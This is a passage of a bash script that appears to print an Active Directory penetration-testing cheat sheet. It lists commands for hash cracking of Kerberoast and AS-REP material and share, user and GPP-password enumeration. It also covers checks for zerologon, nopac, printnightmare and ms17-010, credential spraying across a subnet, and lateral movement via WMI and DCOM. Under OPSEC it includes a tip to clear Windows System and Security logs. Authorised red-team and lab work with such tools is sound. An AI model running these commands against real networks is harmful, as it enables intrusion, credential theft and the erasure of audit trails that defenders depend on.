    p_cmd_display "${NXC} ldap ${ip} ${auth_nxc} --bloodhound -c All"
    p_cmd_display "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
    p_cmd_display "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"

    # Enumeration
    lprint "${BOLD}  [4] Enumeration${NC}"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} --shares"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} --users"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} --sessions"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M gpp_password"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M spider_plus -o READ_ONLY=true"

    # Vuln Checks
    lprint "${BOLD}  [5] Vulnerability Checks${NC}"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M nopac"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M zerologon"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M petitpotam"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M ms17-010"
    p_cmd_display "${NXC} smb ${ip} ${auth_nxc} -M printnightmare"

    # Lateral movement
    lprint "${BOLD}  [6] Lateral Movement${NC}"
    p_cmd_display "${NXC} smb SUBNET/24 ${auth_nxc}  ${DIM}# spray subnet${NC}"
    p_cmd_display "$(imp wmiexec) ${auth_imp}         ${DIM}# pivot via WMI${NC}"
    p_cmd_display "$(imp dcomexec) ${auth_imp} 'cmd.exe'  ${DIM}# DCOM${NC}"

    # OPSEC
    lprint "${BOLD}  [!] OPSEC${NC}"
    p_tip "Check AV: ${NXC} smb ${ip} ${auth_nxc} -M enum_av"
    p_tip "Clear logs: wevtutil cl System && wevtutil cl Security"

    lprint "${BOLD}${LC}╚══════════════════════════════════════════════════════════╝${NC}\n"
}

